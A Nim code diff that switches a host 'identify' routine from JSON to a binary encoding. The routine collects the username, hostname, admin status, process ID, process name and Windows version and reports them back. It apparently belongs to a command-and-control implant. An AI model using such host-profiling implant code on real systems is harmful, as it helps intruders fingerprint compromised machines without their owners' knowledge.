@@ -67,21 +67,19 @@ proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username:
     data: ""
   )
 
-  let j = %*{
-        "username": username,
-        "hostname": hostname,
-        "isAdmin": isAdmin,
-        "osType": osType,
-        "pid": pid,
-        "pname": $pname,
-        "windowsOsVersionInfo": {
-          "majorVersion": windowsVersionInfo.majorVersion,
-          "minorVersion": windowsVersionInfo.minorVersion,
-          "buildNumber": windowsVersionInfo.buildNumber,
-        }
-      }
+  let b = initBuilder()
+
+  b.addString(username)
+  b.addString(hostname)
+  b.addBool(isAdmin)
+  b.addString(osType)
+  b.addInt32(cast[int32](pid))
+  b.addString(pname)
+  b.addInt32(cast[int32](windowsVersionInfo.majorVersion))
+  b.addInt32(cast[int32](windowsVersionInfo.minorVersion))
+  b.addInt32(cast[int32](windowsVersionInfo.buildNumber))
   
-  taskOutput.data = $j
+  taskOutput.data = b.encodeString()
   app.sendOutput(taskOutput)
 
 proc unknownTask*(app: App, taskId: int, taskName: string) =
